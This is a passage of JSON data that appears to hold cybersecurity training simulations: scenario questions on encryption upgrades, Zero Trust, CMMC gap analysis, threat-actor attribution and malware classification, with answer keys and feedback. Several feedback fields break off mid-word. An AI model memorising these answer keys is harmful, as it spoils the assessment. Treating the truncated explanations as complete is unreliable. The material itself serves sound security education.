equivalent security to RSA 3072 with much smaller keys and faster operations. It's a valid modern choice. However, some older systems and clients may have compatibility issues with ECC certificates, which could affect some customers."}, {"id": "D", "text": "RSA 1024-bit for performance, since the load balancer handles many connections", "is_optimal": false, "feedback": "RSA 1024-bit has been deprecated and considered insecure since 2013. NIST, PCI DSS, and all major standards prohibit its use. Modern computing can factor 1024-bit keys. This would fail compliance audits and provide inadequate protection."}]}, {"id": "D1S3-DP-005", "title": "Legacy System Encryption Upgrade", "situation": "While the new certificate is being issued, you turn attention to the deprecated encryption findings. The payroll system using 3DES processes sensitive employee financial data. The vendor says the system 'requires' 3DES.", "question": "How should you approach the legacy payroll system's 3DES usage?", "options": [{"id": "A", "text": "Accept the vendor's statement - if the system requires 3DES, document it as a compensating control exception", "is_optimal": false, "feedback": "Simply accepting vendor limitations without investigation isn't due diligence. 3DES is deprecated and will eventually be prohibited entirely. A compensating control exception requires actual compensating controls, not just documentation of the weakness."}, {"id": "B", "text": "Immediately disable 3DES on the system to enforce compliance", "is_optimal": false, "feedback": "Abruptly disabling encryption without a migration path could break the payroll system entirely, preventing employees from being paid. This could cause more harm than the vulnerability. Changes need to be planned and tested."}, {"id": "C", "text": "Research the system's actual capabilities, engage vendor support for upgrade path, implement network segmentation as interim control", "is_optimal": true, "feedback": "Excellent systematic approach. Many 'requirements' are actually defaults that can be changed. Engaging the vendor properly often reveals upgrade paths. Network segmentation reduces exposure while you work on the permanent fix - a true compensating control."}, {"id": "D", "text": "Replace the entire payroll system with a modern cloud-based solution", "is_optimal": false, "feedback": "While modernization may be the right long-term answer, replacing an entire payroll system is a major project taking months or years. It doesn't address the immediate vulnerability and introduces significant business risk. You need interim solutions."}]}], "passing_score": 70, "max_score": 100}, {"id": "D1-SIM-004", "domain": 1, "type": "SIM", "title": "Zero Trust Migration", "difficulty": "intermediate", "role": "security_engineer", "organization": {"name": "Stratos Aerospace"}, "introduction": "Stratos Aerospace, a defense contractor, has been mandated by the DoD to implement Zero Trust Architecture per Executive Order 14028 and NIST SP 800-207. Their current perimeter-based security model has a flat internal network where any authenticated user can access most resources. A recent insider threat incident exposed sensitive design documents. You've been brought in to architect and begin implementing Zero Trust.", "decision_points": [{"id": "D1S4-DP-001", "title": "Zero Trust Foundation", "situation": "Leadership has approved the Zero Trust initiative but wants to understand the fundamental shift in security philosophy. The CTO asks you to explain the core difference from their current model.", "question": "What is the FUNDAMENTAL difference between traditional perimeter security and Zero Trust?", "options": [{"id": "A", "text": "Zero Trust requires more firewalls and network security devices", "is_optimal": false, "feedback": "Zero Trust isn't about adding more perimeter devices - it's a philosophical shift. Traditional security adds more walls; Zero Trust assumes walls are already breached and protects resources individually."}, {"id": "B", "text": "Traditional security trusts internal users by default; Zero Trust verifies every access request regardless of location", "is_optimal": true, "feedback": "Exactly right. Traditional perimeter security operates on 'trust but verify' - once inside the network, users are trusted. Zero Trust operates on 'never trust, always verify' - every access request is authenticated and authorized regardless of whether it originates inside or outside the network."}, {"id": "C", "text": "Zero Trust means removing all firewalls and letting identity be the only security control", "is_optimal": false, "feedback": "This is a misconception. Zero Trust is additive - it adds identity-centric controls on top of existing security layers. Firewalls still provide value for network protection and segmentation. Zero Trust enhances, not replaces, defense in depth."}, {"id": "D", "text": "Zero Trust is primarily about implementing VPNs for all remote access", "is_optimal": false, "feedback": "VPNs actually represent the old model - they grant broad network access once authenticated. Zero Trust often replaces VPNs with Zero Trust Network Access (ZTNA) that grants access to specific applications, not entire network segments."}]}, {"id": "D1S4-DP-002", "title": "Implementation Starting Point", "situation": "With leadership aligned, you need to determine where to begin implementation. The organization has limited resources and needs quick wins while building toward full Zero Trust.", "question": "What should be the FIRST major Zero Trust implementation focus?", "options": [{"id": "A", "text": "Implement full microsegmentation across all network segments immediately", "is_optimal": false, "feedback": "Full microsegmentation is important but attempting it first is extremely complex and disruptive. You need strong identity foundations before you can effectively enforce granular network policies. This approach often stalls due to scope and complexity."}, {"id": "B", "text": "Start with identity - implement strong authentication (MFA) and centralized identity management", "is_optimal": true, "feedback": "Excellent. Identity is the foundation of Zero Trust. Before you can make access decisions based on user, device, and context, you need to reliably know WHO is requesting access. Strong authentication (MFA) and unified identity management enable all other Zero Trust controls."}, {"id": "C", "text": "Deploy a Zero Trust Network Access (ZTNA) product to replace VPN", "is_optimal": false, "feedback": "ZTNA is valuable but putting it before identity creates a weak foundation. ZTNA effectiveness depends on strong authentication and identity signals. Without solid identity, ZTNA can't make good access decisions."}, {"id": "D", "text": "Begin by encrypting all internal network traffic", "is_optimal": false, "feedback": "Encrypting internal traffic (mutual TLS) is a Zero Trust principle, but it doesn't help with access control. Without strong identity and authorization, encrypted traffic from unauthorized users is still unauthorized - just encrypted. Identity comes first."}]}, {"id": "D1S4-DP-003", "title": "Multi-Factor Authentication Strategy", "situation": "MFA deployment is approved. You need to select the authentication factors and methods for the organization. Security must be strong, but usability affects adoption.", "question": "What MFA strategy should you recommend for general workforce authentication?", "options": [{"id": "A", "text": "SMS-based one-time passwords as the second factor", "is_optimal": false, "feedback": "SMS OTP is better than password-only but is considered weak MFA. SMS is vulnerable to SIM swapping, SS7 attacks, and social engineering. NIST and security frameworks recommend against SMS for high-security environments like defense contractors."}, {"id": "B", "text": "Phishing-resistant MFA: FIDO2 security keys for privileged users, authenticator apps with number matching for general users", "is_optimal": true, "feedback": "Excellent tiered approach. FIDO2 security keys provide the strongest phishing resistance for high-value accounts. Authenticator apps with number matching (not just push approve) provide strong protection for general users while maintaining usability. This meets CMMC and EO 14028 requirements."}, {"id": "C", "text": "Biometric authentication only - fingerprint or facial recognition on all devices", "is_optimal": false, "feedback": "Biometrics alone (something you are) combined with password (something you know) is reasonable, but biometrics can be bypassed and can't be changed if compromised. A combination approach with hardware tokens provides stronger assurance. Also, not all devices support biometrics."}, {"id": "D", "text": "Email-based verification codes as the second factor", "is_optimal": false, "feedback": "Email-based codes are weak MFA - if an attacker compromises email (common in phishing attacks), they get the MFA codes too. This creates circular dependency and doesn't meaningfully improve security over passwords alone."}]}, {"id": "D1S4-DP-004", "title": "Device Trust Implementation", "situation": "With identity strengthened, you're implementing device trust - ensuring only compliant devices can access resources. The organization has a mix of corporate-managed and personal devices (BYOD for some roles).", "question": "How should device trust be implemented in this environment?", "options": [{"id": "A", "text": "Block all personal devices - only corporate-managed devices can access any resources", "is_optimal": false, "feedback": "While simpler, completely blocking personal devices may not be practical for all roles and can hurt productivity. A risk-based approach that limits what BYOD can access while allowing managed devices full access is more balanced."}, {"id": "B", "text": "Allow any device that has current antivirus installed", "is_optimal": false, "feedback": "Antivirus alone is insufficient for device trust. Device posture should include: OS version and patches, encryption status, management enrollment, security configuration, and more. Antivirus is just one factor."}, {"id": "C", "text": "Implement tiered access: managed devices with full compliance get full access; BYOD with basic checks get limited access to non-sensitive resources", "is_optimal": true, "feedback": "Excellent. Tiered device trust aligns access with device assurance level. Managed devices meeting all compliance requirements (patched, encrypted, managed, healthy) access sensitive resources. BYOD meeting basic requirements (current OS, screen lock) access only low-sensitivity resources like email and general collaboration."}, {"id": "D", "text": "Use network location as the primary trust signal - on-premise devices are trusted", "is_optimal": false, "feedback": "This is the opposite of Zero Trust! Network location should not determine trust level. A compromised device on the corporate network is more dangerous than a healthy device remotely. Zero Trust evaluates device health regardless of location."}]}, {"id": "D1S4-DP-005", "title": "Network Segmentation Strategy", "situation": "The network team is ready to begin segmentation. Currently, the network is relatively flat with broad VLAN access. You need to design the segmentation approach.", "question": "What segmentation strategy best aligns with Zero Trust for this defense contractor?", "options": [{"id": "A", "text": "Traditional VLAN segmentation by department: Engineering VLAN, Corporate VLAN, Manufacturing VLAN", "is_optimal": false, "feedback": "Department-based VLANs are a start but still create large trust zones. The insider incident occurred because an engineer could access all engineering resources, not just their project. Zero Trust requires more granular segmentation based on data sensitivity and need-to-know."}, {"id": "B", "text": "Microsegmentation with application-level policies - each application/workload isolated with explicit allow rules", "is_optimal": true, "feedback": "Excellent. Microsegmentation creates security boundaries around individual workloads or applications rather than network segments. Traffic is allowed only via explicit policies based on identity, device, and context. This prevents lateral movement even if one system is compromised."}, {"id": "C", "text": "Air-gap all sensitive systems with no network connectivity", "is_optimal": false, "feedback": "Air-gapping prevents all network-based attacks but severely impacts usability and collaboration. True air-gapping is reserved for the most sensitive classified systems. Most resources need some connectivity; Zero Trust provides protection while maintaining usability."}, {"id": "D", "text": "Segment only between classified and unclassified networks", "is_optimal": false, "feedback": "Classification-based segmentation is necessary but insufficient. The insider incident occurred entirely within the unclassified network - commercial aviation vs. military drone documents. You need segmentation within classification levels based on project and need-to-know."}]}], "passing_score": 70, "max_score": 100}, {"id": "D1-SIM-005", "domain": 1, "type": "SIM", "title": "The Gap Analysis", "difficulty": "advanced", "role": "grc_analyst", "organization": {"name": "Pinnacle Manufacturing"}, "introduction": "Pinnacle Manufacturing, a mid-sized industrial equipment manufacturer, has landed a major contract with a defense prime contractor. The contract requires CMMC Level 2 certification within 18 months. Their current security program is informal with no structured framework. You've been engaged to perform a comprehensive gap analysis against NIST 800-171 (which underlies CMMC) and develop a remediation roadmap.", "decision_points": [{"id": "D1S5-DP-001", "title": "Gap Analysis Approach", "situation": "You're beginning the gap analysis. The IT Director wants to jump straight to technical scanning, but you need to ensure a comprehensive approach.", "question": "What should be your approach to conducting this gap analysis?", "options": [{"id": "A", "text": "Start with comprehensive vulnerability scanning to identify technical gaps", "is_optimal": false, "feedback": "Vulnerability scanning identifies technical weaknesses but doesn't assess policy, process, or procedural gaps. CMMC requires both technical controls AND documented policies/procedures. A scan-first approach misses critical governance gaps."}, {"id": "B", "text": "Interview key stakeholders and review documentation first, then validate with technical assessment", "is_optimal": true, "feedback": "Excellent. A comprehensive gap analysis starts with understanding current state through interviews and document review (policies, procedures, configurations). Technical validation confirms what exists and identifies undocumented gaps. This addresses all three CMMC assessment objectives: policy, implementation, and documentation."}, {"id": "C", "text": "Use an automated compliance assessment tool to check all 110 controls", "is_optimal": false, "feedback": "Automated tools can help with technical controls but can't assess policy adequacy, procedural effectiveness, or personnel practices. Many NIST 800-171 controls require human judgment to assess. Tools are helpful but insufficient alone."}, {"id": "D", "text": "Focus only on the control families where you expect gaps based on the preliminary findings", "is_optimal": false, "feedback": "A gap analysis must be comprehensive - all 110 controls must be assessed for CMMC certification. Focusing only on expected gaps may miss unexpected deficiencies. The C3PAO will assess everything, so you must too."}]}, {"id": "D1S5-DP-002", "title": "Control Framework Selection", "situation": "The CEO asks why you're assessing against NIST 800-171 specifically. They've heard of other frameworks like ISO 27001 and want to understand the choice.", "question": "How should you explain the framework selection for this assessment?", "options": [{"id": "A", "text": "NIST 800-171 is the best framework - always use it for any security assessment", "is_optimal": false, "feedback": "No framework is universally 'best.' Framework selection depends on requirements: regulatory mandates, industry standards, customer requirements. NIST 800-171 is required here because CMMC is based on it, not because it's inherently superior."}, {"id": "B", "text": "CMMC Level 2 is based on NIST 800-171 - assessing against it directly maps to your certification requirement", "is_optimal": true, "feedback": "Exactly right. Framework selection should align with business requirements. CMMC Level 2's 110 practices come directly from NIST 800-171. Assessing against 800-171 provides direct mapping to CMMC requirements. Other frameworks might have overlapping controls but wouldn't directly satisfy the contract requirement."}, {"id": "C", "text": "ISO 27001 would be easier - suggest switching to that framework instead", "is_optimal": false, "feedback": "ISO 27001 doesn't satisfy CMMC requirements. While there's overlap between frameworks, CMMC certification specifically requires NIST 800-171 controls. ISO 27001 certification wouldn't allow them to handle CUI or fulfill the defense contract."}, {"id": "D", "text": "Combine multiple frameworks - assess against NIST, ISO, and CIS Controls simultaneously", "is_optimal": false, "feedback": "Multi-framework assessments have value but add complexity and cost. For this engagement, the requirement is specifically CMMC/NIST 800-171. Adding frameworks doesn't help achieve the immediate goal and stretches limited resources. Focus on what's required first."}]}, {"id": "D1S5-DP-003", "title": "Gap Severity Classification", "situation": "After completing interviews and technical assessment, you have findings across all 14 control families. You need to classify gaps by severity to prioritize remediation. One finding: 'No MFA implemented for remote access.'", "question": "How should this MFA gap be classified?", "options": [{"id": "A", "text": "Low - MFA is a nice-to-have enhancement, basic password authentication exists", "is_optimal": false, "feedback": "MFA is not optional for NIST 800-171 compliance. Control 3.5.3 requires multi-factor authentication for network access to privileged and non-privileged accounts. Without MFA, this control fails completely. This is a significant gap."}, {"id": "B", "text": "Medium - It's a compliance gap but can be addressed during normal IT upgrades", "is_optimal": false, "feedback": "While this could be rolled into IT upgrades, classification should reflect compliance impact and risk, not remediation convenience. Remote access without MFA is a high-risk vulnerability and a clear compliance failure for multiple NIST 800-171 requirements."}, {"id": "C", "text": "High - MFA is explicitly required by NIST 800-171, and remote access without MFA is high-risk for credential theft", "is_optimal": true, "feedback": "Correct classification. MFA is explicitly required (3.5.3), remote access is a primary attack vector, and credential theft without MFA protection is highly likely given current threat landscape. This gap represents both compliance failure and significant security risk."}, {"id": "D", "text": "Critical - Immediately shut down remote access until MFA is implemented", "is_optimal": false, "feedback": "While the gap is serious, 'Critical' typically implies immediate threat or active exploitation. Shutting down remote access would severely impact operations. High severity with prioritized remediation is appropriate - urgent but not emergency shutdown."}]}, {"id": "D1S5-DP-004", "title": "Baseline Configuration Gap", "situation": "The assessment finds no documented baseline configurations for systems. Systems are configured inconsistently based on individual IT staff preferences.", "question": "What remediation approach should you recommend for the baseline configuration gap?", "options": [{"id": "A", "text": "Document the current configuration of each system as-is - that becomes the baseline", "is_optimal": false, "feedback": "Documenting current state isn't creating a secure baseline - it's just recording potentially insecure configurations. Baselines should define the DESIRED secure state, not simply document the existing state which may include vulnerabilities."}, {"id": "B", "text": "Adopt industry-standard baselines (CIS Benchmarks, DISA STIGs) customized for business requirements, with documented exceptions", "is_optimal": true, "feedback": "Excellent. Industry baselines provide tested, secure configurations aligned with compliance requirements. CIS Benchmarks and DISA STIGs are widely accepted and map to NIST controls. Customization acknowledges business needs while documented exceptions maintain compliance visibility."}, {"id": "C", "text": "Create proprietary baseline documents from scratch specific to Pinnacle", "is_optimal": false, "feedback": "Creating baselines from scratch is time-consuming and error-prone. Industry baselines represent collective expertise and are updated for new vulnerabilities. Custom baselines also face scrutiny from assessors who may question their adequacy. Start with industry standards."}, {"id": "D", "text": "Implement the most restrictive possible configuration on all systems for maximum security", "is_optimal": false, "feedback": "Maximum restriction breaks functionality. Baselines must balance security with usability. Overly restrictive configurations cause workarounds that often create greater security risks. The goal is appropriate security, not maximum restriction."}]}, {"id": "D1S5-DP-005", "title": "Technical vs Administrative Control Balance", "situation": "Many gaps could be addressed with either technical controls or administrative controls (policies/procedures). Resources are limited. The IT Director prefers technical solutions; the CFO prefers policy solutions as they're cheaper.", "question": "How should you balance technical and administrative controls in the remediation plan?", "options": [{"id": "A", "text": "Prioritize technical controls - they're enforceable and harder to bypass than policies", "is_optimal": false, "feedback": "Technical controls are often preferable but not always sufficient alone. NIST 800-171 requires documented policies AND implemented controls. Some requirements are inherently administrative (training, personnel screening). A balanced approach is needed."}, {"id": "B", "text": "Prioritize policies and procedures - they satisfy compliance requirements at lower cost", "is_optimal": false, "feedback": "Policies without enforcement are ineffective. 'We have a policy' doesn't protect systems if it's not implemented. Assessors verify both policy existence AND implementation. Policy-only approaches often fail assessments and certainly fail security tests."}, {"id": "C", "text": "Defense in depth - technical controls enforcing requirements, policies documenting standards, and monitoring validating both", "is_optimal": true, "feedback": "Exactly right. Effective security requires: policies defining requirements, technical controls enforcing them where possible, administrative controls (training, procedures) for human-dependent processes, and monitoring to verify effectiveness. This layered approach satisfies compliance and provides actual security."}, {"id": "D", "text": "Let each control owner decide - IT implements technical solutions, HR implements administrative solutions", "is_optimal": false, "feedback": "Decentralized decision-making creates inconsistency and gaps. Some controls require coordinated technical and administrative components. A unified approach ensures coverage and alignment. Security should drive the approach, not organizational convenience."}]}], "passing_score": 70, "max_score": 100}, {"id": "D2-REM-001", "domain": 2, "type": "REM", "title": "Know Your Enemy", "difficulty": "foundational", "role": "Security Analyst", "organization": {"name": "CyberDefense Academy"}, "introduction": "Welcome to Day 1 of your threat intelligence analyst training at CyberDefense Academy. Your mentor, Senior Analyst Martinez, has prepared a series of exercises to help you master threat actor classification. 'Understanding who attacks us and why is fundamental to defense,' she explains. 'Attribution isn't about revenge - it's about predicting behavior, prioritizing defenses, and communicating risk to leadership. Let's start with the basics and work through increasingly complex scenarios.'", "decision_points": [{"id": "decision_1", "title": "Basic Actor Identification", "situation": "Analyst Martinez starts with a warm-up. 'A company reports an incident: their website was defaced with political messaging about climate change, their customer database was leaked online with a statement calling out the company's environmental practices, and a Twitter account claimed credit linking to leaked data. No ransom demand. No evidence of long-term access. What type of threat actor is this?'", "question": "What type of threat actor MOST likely conducted this attack?", "options": [{"id": "A", "text": "Nation-state actor conducting influence operations", "is_optimal": false, "feedback": "{'short': 'Nation-states rarely claim credit publicly like this', 'detailed': \"Nation-state actors prioritize stealth and deniability. They don't typically deface websites with political messages or claim credit on social media. Their influence operations are more subtle. The public nature and ideological messaging point to hacktivists.\", 'consequence': 'Misattribution leads to over-escalation and wrong defensive focus.'}"}, {"id": "B", "text": "Hacktivist group with environmental ideology", "is_optimal": true, "feedback": "{'short': 'Correct! Classic hacktivist indicators', 'detailed': 'This has all the hallmarks of hacktivism: website defacement with ideological message, data leak for embarrassment (not sale), public claim of responsibility on social media, target selection based on perceived environmental harm, and no financial motivation. Hacktivists want publicity for their cause.', 'consequence': 'Correct attribution informs appropriate response - focus on public relations and fixing the vulnerabilities explo"}, {"id": "C", "text": "Organized crime group attempting extortion", "is_optimal": false, "feedback": "{'short': 'No financial motive evident', 'detailed': \"Criminal groups want money. There's no ransom demand, no offer to sell the data back, no threat to leak unless paid. The data was leaked freely with political messaging. Criminals don't waste valuable data on political statements - they monetize it.\", 'consequence': 'Waiting for ransom demand that never comes. Missing the reputational response needed.'}"}, {"id": "D", "text": "Insider threat from disgruntled employee", "is_optimal": false, "feedback": "{'short': 'Possible but public claim points elsewhere', 'detailed': \"An insider could have access, but the public Twitter claim and coordination with ideological messaging suggests an external hacktivist group. Insiders typically don't maintain public social media presence claiming attacks - they try to remain anonymous or frame others.\", 'consequence': 'Internal investigation while external hacktivist group continues operations against industry targets.'}"}]}, {"id": "decision_2", "title": "Motivation Analysis", "situation": "'Good,' Martinez says. 'Now let's think about motivation. A healthcare organization reports: patient records accessed and encrypted with ransomware, ransom note demanding $500,000 in Bitcoin, threat to leak data if not paid, attack occurred through phishing email. What is the PRIMARY motivation?'", "question": "What is the PRIMARY motivation behind this attack?", "options": [{"id": "A", "text": "Espionage - healthcare data has intelligence value", "is_optimal": false, "feedback": "{'short': \"Espionage actors don't demand ransom\", 'detailed': \"Espionage actors steal data quietly for intelligence purposes. They don't encrypt it and demand payment. The ransomware and Bitcoin demand clearly indicate financial motivation, not espionage. Espionage actors would exfiltrate silently and maintain access.\", 'consequence': 'Treating this as espionage delays ransom negotiation and recovery decisions.'}"}, {"id": "B", "text": "Financial gain - ransomware is a money-making operation", "is_optimal": true, "feedback": "{'short': 'Correct! Clear financial motivation', 'detailed': 'This is textbook financially motivated cybercrime: ransomware encryption, specific Bitcoin ransom demand, double extortion (pay or we leak). Healthcare is targeted because they need data urgently (patient care) and often pay. The actors want money - nothing else explains the behavior.', 'consequence': 'Correct motivation assessment informs business decisions about ransom, recovery strategy, and future defenses.'}"}, {"id": "C", "text": "Disruption - someone wants to harm healthcare operations", "is_optimal": false, "feedback": "{'short': 'Disruption is an effect, not the motivation', 'detailed': \"The attack causes disruption, but that's the LEVERAGE for payment, not the goal. If disruption were the motivation, there would be no ransom demand - they'd just destroy the data. The offer to provide decryption key for payment proves the motivation is financial.\", 'consequence': \"Focus on 'who wants to disrupt us' instead of 'this is a criminal money-making operation.'\"}"}, {"id": "D", "text": "Revenge - targeted attack from someone with a grudge", "is_optimal": false, "feedback": "{'short': 'No indicators of targeted revenge', 'detailed': 'Revenge attacks are personal and targeted. This attack pattern - phishing email, ransomware, Bitcoin demand - is standard criminal operations used against thousands of targets. Nothing suggests personal targeting or revenge motivation.', 'consequence': \"Wasted investigation into 'who has a grudge' when this is opportunistic criminal targeting.\"}"}]}, {"id": "decision_3", "title": "Sophistication Assessment", "situation": "Martinez presents another scenario: 'Security logs show: Nmap scans from 50+ different IPs against your external hosts, brute force attempts against SSH using common password lists, attempted exploitation of Apache Struts vulnerability from 2017, all activity is noisy and easily detected. What's your assessment of the attacker sophistication?'", "question": "What level of sophistication does this activity indicate?", "options": [{"id": "A", "text": "High sophistication - coordinated attack from multiple IPs suggests botnet", "is_optimal": false, "feedback": "{'short': \"Multiple IPs doesn't mean sophisticated\", 'detailed': 'Using multiple IPs for scanning is trivial - free proxy lists, Tor exit nodes, or cheap VPS services. Sophisticated attackers are characterized by: custom tools, zero-days, stealth, and operational security. This activity is noisy, uses default tools, and tries old vulnerabilities. Multiple IPs just shows basic operational awareness.', 'consequence': 'Overestimate threat, deploy expensive countermeasures against amateur activity.'"}, {"id": "B", "text": "Low sophistication - noisy scanning with old exploits indicates script kiddie", "is_optimal": true, "feedback": "{'short': 'Correct! Classic low-sophistication indicators', 'detailed': \"This is textbook script kiddie behavior: using Nmap with default settings (easily detected), brute forcing with common password lists, trying exploits for years-old vulnerabilities (2017 Struts), no attempt at stealth. Sophisticated attackers avoid detection; these attackers don't even try. Low threat if basic security is in place.\", 'consequence': \"Appropriate response - ensure patches are current, implement rate limiting,"}, {"id": "C", "text": "Medium sophistication - automated tools but showing persistence", "is_optimal": false, "feedback": "{'short': \"Persistence without stealth isn't sophistication\", 'detailed': \"Running scans repeatedly doesn't indicate sophistication - it just indicates the attacker hasn't moved on yet. Sophistication is measured by technical capability and operational security, not persistence. These attackers are using basic tools with no evasion.\", 'consequence': 'Moderate response when minimal response would suffice.'}"}, {"id": "D", "text": "Cannot assess - need more information about the attacker", "is_optimal": false, "feedback": "{'short': 'We have enough indicators to assess', 'detailed': \"The noisy scanning, default tool signatures, old exploit attempts, and lack of stealth ARE the assessment. You don't need to identify the specific attacker to assess sophistication. The technique quality tells you about capability.\", 'consequence': \"Analysis paralysis - waiting for information you don't need while attacks continue.\"}"}]}, {"id": "decision_4", "title": "Attribution Confidence", "situation": "Martinez shows you a threat report: 'An attack on a defense contractor used malware with code overlap matching APT41, targeted data related to aerospace technology, infrastructure included a C2 server previously linked to Chinese operations, and timing coincided with US-China trade tensions. How confident should we be in attributing this to APT41?'", "question": "What confidence level is appropriate for this attribution?", "options": [{"id": "A", "text": "High confidence - multiple indicators point to APT41", "is_optimal": true, "feedback": "{'short': 'Correct! Multiple independent indicators support attribution', 'detailed': 'High confidence attribution is supported by: code overlap with known APT41 malware (technical indicator), infrastructure linked to previous Chinese operations (infrastructure indicator), target profile matching Chinese intelligence priorities (targeting indicator), and geopolitical timing (contextual indicator). Multiple independent indicators corroborating the same actor = high confidence.', 'consequence': 'C"}, {"id": "B", "text": "Medium confidence - could be APT41 or could be false flag", "is_optimal": false, "feedback": "{'short': 'Multiple corroborating indicators support high confidence', 'detailed': 'While false flags are possible, having MULTIPLE independent indicators (code, infrastructure, targeting, timing) all pointing to the same actor significantly increases confidence. False flags typically only replicate one or two indicators. The convergence of evidence here supports high confidence.', 'consequence': 'Unnecessarily hedged communication reduces usefulness of threat intelligence.'}"}, {"id": "C", "text": "Low confidence - circumstantial evidence only", "is_optimal": false, "feedback": "{'short': 'Code and infrastructure overlap is not circumstantial', 'detailed': \"Code overlap with known malware and shared C2 infrastructure are technical indicators, not circumstantial. 'Circumstantial' would be just targeting pattern or geopolitical timing alone. The combination of technical indicators with contextual factors supports high confidence.\", 'consequence': 'Valuable threat intelligence dismissed as speculation. Defensive opportunities missed.'}"}, {"id": "D", "text": "Cannot attribute - never identify specific actors", "is_optimal": false, "feedback": "{'short': 'Attribution is valuable when evidence supports it', 'detailed': 'Attribution, when properly supported by evidence, enables: understanding adversary capabilities, predicting future behavior, sharing intelligence with partners, and briefing leadership. Refusing to attribute when evidence supports it wastes valuable intelligence. Attribute with appropriate confidence levels.', 'consequence': 'Organization operates in the dark about who is targeting them and why.'}"}]}, {"id": "decision_5", "title": "Nation-State vs Criminal", "situation": "'This is a critical distinction,' Martinez emphasizes. 'A financial services company reports: attackers gained access through spear-phishing, moved laterally to SWIFT payment systems, attempted to initiate $50 million in wire transfers to overseas accounts, used custom malware not seen before, maintained access for 3 months before attempting theft. Nation-state or criminal?'", "question": "Is this MOST likely a nation-state or criminal threat actor?", "options": [{"id": "A", "text": "Nation-state - custom malware and 3-month dwell time indicate APT", "is_optimal": false, "feedback": "{'short': \"Sophistication alone doesn't mean nation-state\", 'detailed': \"Custom malware and patient operations are not exclusive to nation-states. Sophisticated criminal groups (like Lazarus or FIN7) also develop custom tools and conduct multi-month operations. The KEY differentiator is OBJECTIVE. This attack aims to steal money via wire fraud - that's a criminal objective. Nation-states conducting espionage don't typically attempt wire transfers.\", 'consequence': \"Treating this as espionage whe"}, {"id": "B", "text": "Criminal - the objective is financial theft via wire transfers", "is_optimal": true, "feedback": "{'short': 'Correct! Objective determines classification', 'detailed': 'The defining characteristic is the OBJECTIVE: stealing money via SWIFT wire transfers. This is financial crime, not espionage. Yes, the operation is sophisticated (custom malware, patient access), but sophisticated criminals exist. Lazarus Group (North Korea) conducts exactly these operations - nation-state resources but criminal objectives (sanctions evasion through theft).', 'consequence': 'Correct classification informs re"}, {"id": "C", "text": "Nation-state criminal hybrid - could be state-sponsored financial theft", "is_optimal": false, "feedback": "{'short': 'Valid nuance but still classified by objective', 'detailed': \"You're thinking of groups like Lazarus (North Korea) that blur the line. While technically nation-state sponsored, their SWIFT heist operations are CRIMINAL in nature. For response purposes, classify based on objective and behavior. Whether the criminal is employed by a government doesn't change how you respond to a wire fraud attempt.\", 'consequence': 'Overthinking classification. The response (stop the theft, involve law "}, {"id": "D", "text": "Cannot determine without more information", "is_optimal": false, "feedback": "{'short': 'The wire transfer objective is the key indicator', 'detailed': \"The attempted $50 million wire transfer tells you the objective is financial theft. That's the critical classification indicator. You don't need to identify the specific group to know this is a financially-motivated operation requiring a different response than espionage.\", 'consequence': 'Analysis paralysis while the incident response waits for classification.'}"}]}], "passing_score": 70, "max_score": 100}, {"id": "D2-REM-002", "domain": 2, "type": "REM", "title": "Malware Menagerie", "difficulty": "foundational", "role": "Security Analyst", "organization": {"name": "SecureLearn Training Institute"}, "introduction": "Welcome to the Malware Analysis fundamentals course. Dr. Chen greets you at the isolated training lab. 'Understanding malware - what it is, how it behaves, and how to identify it - is fundamental to security operations. Today we'll examine different malware types, learn to recognize their behaviors, and practice identifying indicators of compromise. By the end, you'll be able to look at an alert or artifact and understand what you're dealing with.'", "decision_points": [{"id": "decision_1", "title": "Basic Malware Classification", "situation": "Dr. Chen starts with fundamentals. 'An analyst reports: user opened email attachment, Word spawned PowerShell, PowerShell downloaded and executed a file, the file is now communicating with an external server and the attacker has remote shell access. What category of malware is the initial Word document?'", "question": "What type of malware is the Word document that started this infection chain?", "options": [{"id": "A", "text": "Virus - it infected the Word application", "is_optimal": false, "feedback": "{'short': 'Viruses replicate by attaching to files', 'detailed': \"A virus would attach itself to other executable files and spread when those files are run. This Word document isn't replicating or attaching to other files - it's a document that tricks the user into enabling malicious macros. The document itself is a delivery mechanism, not a self-replicating virus.\", 'consequence': 'Misclassification leads to wrong detection strategy.'}"}, {"id": "B", "text": "Trojan - it appears legitimate but delivers malicious payload", "is_optimal": true, "feedback": "{'short': 'Correct! Classic trojan behavior', 'detailed': \"This is a trojan: it appears to be a legitimate document (invoice, resume, etc.) but when opened, it executes malicious code via macros. Trojans don't self-replicate - they rely on social engineering to get users to run them. The Word doc is a 'dropper' trojan that delivers the next stage payload.\", 'consequence': 'Correct classification informs user awareness focus and email security priorities.'}"}, {"id": "C", "text": "Worm - it's spreading through the network", "is_optimal": false, "feedback": "{'short': 'Worms spread automatically without user action', 'detailed': \"Worms self-propagate by exploiting vulnerabilities - they don't require user interaction. This malware required the user to open the document and enable macros. The attacker might later move laterally, but the initial document isn't a worm - it's a trojan that needed user action to execute.\", 'consequence': 'Focus on network segmentation when email security is the issue.'}"}, {"id": "D", "text": "RAT - the attacker has remote access", "is_optimal": false, "feedback": "{'short': 'RAT is the payload, not the initial document', 'detailed': \"You're right that a RAT (Remote Access Trojan) is involved - the attacker has shell access. But the question asks about the WORD DOCUMENT. The document is a trojan dropper that delivered the RAT. The RAT is the final payload; the document is the delivery mechanism (also a trojan, specifically a dropper).\", 'consequence': 'Confusing delivery mechanism with payload.'}"}]}, {"id": "decision_2", "title": "Identifying Indicators of Compromise", "situation": "'Good. Now let's talk about IoCs,' Dr. Chen continues. 'You're investigating a compromised system. You find: a file hash matching known malware, registry key for persistence, and the malware is connecting to a specific IP address. Which indicator would you prioritize sharing with other teams for IMMEDIATE blocking?'", "question": "Which IoC should be prioritized for IMMEDIATE blocking across the environment?", "options": [{"id": "A", "text": "File hash - block this specific malware everywhere", "is_optimal": false, "feedback": "{'short': 'Useful but easily changed by attackers', 'detailed': 'File hashes are useful for detecting specific malware samples, but attackers can trivially change hashes by recompiling or modifying a single byte. If you only block the hash, the attacker can generate a new variant that bypasses your block. Hashes are good for detection but less effective for blocking.', 'consequence': 'Hash blocked. Attacker uses different variant with new hash. Attack continues.'}"}, {"id": "B", "text": "C2 IP address - block attacker's command and control", "is_optimal": true, "feedback": "{'short': 'Correct! Block C2 to disrupt active operations', 'detailed': \"Blocking the C2 IP address immediately disrupts the attacker's ability to control compromised systems. While attackers can change infrastructure, doing so takes time and may require malware updates. Blocking C2 buys time and may sever existing compromises. This is the highest-impact immediate action.\", 'consequence': \"C2 blocked. Existing compromises can't receive commands. Attacker must establish new infrastructure.\"}"}, {"id": "C", "text": "Registry key - remove persistence mechanism", "is_optimal": false, "feedback": "{'short': 'Important for remediation but not blocking', 